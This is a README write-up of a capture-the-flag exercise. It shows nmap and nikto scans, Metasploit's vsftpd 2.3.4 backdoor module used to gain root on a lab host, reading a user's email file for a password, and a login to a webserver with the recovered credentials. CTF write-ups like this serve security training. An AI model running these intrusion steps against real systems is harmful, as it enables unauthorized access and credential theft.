**Capture the Flag (CTF) Challenges**

This repository contains a comprehensive breakdown of a Capture the Flag (CTF) exercise. Through three well-defined tasks, the project demonstrates practical skills in vulnerability exploitation, sensitive data extraction, and network traffic analysis.

---

üìú **Overview**

Tasks
1. **Compromise the Target Host**  
   Identify and exploit a known vulnerability to gain filesystem access.

2. **Extract the Password from the Email File**  
   Locate and extract a password from an email file stored on the compromised host.

3. **Download the Top-Secret Image**  
   Identify the webserver hosting a confidential image, authenticate, and download the file.

‚ú® **Task Details**

**Task 1: Compromise the Target Host**
- **Objective:** Exploit a vulnerability to gain root access to the target host.  
- **Key Steps:**
  1. **Reconnaissance with Nmap:**
     ```bash
     nmap -sV 192.168.14.226
     ```
     - Discovered an FTP service running `vsftpd 2.3.4`, known for its backdoor vulnerability.
  2. **Web Service Scanning with Nikto:**
     ```bash
     nikto -h 192.168.14.226
     ```
     - Verified potential vulnerabilities on the webserver.
  3. **Exploitation Using Metasploit:**
     ```bash
     msfconsole
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOSTS 192.168.14.226
     exploit
     ```
     - Successfully exploited the backdoor and gained root access.

- **Challenges:**  
  - Identifying the correct IP and service.
  - Matching the Metasploit module to the identified vulnerability.

**Task 2: Extract the Password from the Email File**
- **Objective:** Locate an email file on the compromised host and extract the password.  
- **Key Steps:**
  1. **Search for Email Files:**
     ```bash
     find /home/ -name ".eml"
     ```
     - Found: `/home/kevin/mail/email001.eml`.
  2. **Extract Information:**
     ```bash
     cat /home/kevin/mail/email001.eml
     ```
     - Retrieved sender and receiver email addresses and the password.

- **Challenges:**  
  - Navigating the filesystem without prior knowledge of file locations.
  - Correctly interpreting the email contents.

**Task 3: Download the Top-Secret Image**
- **Objective:** Identify the webserver hosting the top-secret image, authenticate, and download the file.  
- **Key Steps:**
  1. **Network Scanning with Nmap:**
     ```bash
     nmap -p 80 192.168.14.0/24
     ```
     - Discovered multiple hosts with open HTTP ports.
  2. **Automated Target Identification Script:**
     ```bash
     ./scan_webservers.sh
     ```
     - Identified potential servers and standardized login credentials.
  3. **Traffic Analysis with Wireshark:**
     - Applied a filter:
       ```
       tcp.port == 80
       ```
     - Pinpointed the target IP: `192.168.13.220`.
  4. **Accessing and Downloading the Image:**
     - Navigated to `http://192.168.13.220` in a browser.
     - Used extracted credentials (`kevin:password`) to log in and download the image.

- **Challenges:**  
  - Narrowing down the correct webserver among many.
  - Effective use of network traffic analysis to identify the target.
